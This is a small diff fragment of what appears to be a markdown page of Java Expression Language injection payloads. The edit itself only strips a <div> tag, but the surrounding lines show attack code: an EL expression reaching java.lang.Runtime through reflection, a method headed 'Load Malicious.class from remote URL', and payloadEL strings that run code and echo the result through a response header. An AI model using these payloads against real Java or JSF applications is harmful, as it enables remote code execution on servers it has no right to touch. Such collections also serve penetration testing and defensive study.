@@ -234,7 +234,7 @@ ${&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethods()[6]
 
 **Method 6.**** Load Malicious.class** from remote URL [3]
 
-<div width="50">
+
 
 
 ```
@@ -246,7 +246,6 @@ payloadEL += &#39;${request.setAttribute(&quot;b&quot;,request.getClass().getCla
 
 payloadEL += &#39;${facesContext.getExternalContext().setResponseHeader(&quot;output&quot;, request.getAttribute(&quot;b&quot;).bang())}&#39;
 ```
-</div>
 
 Malicious.java
 ```java
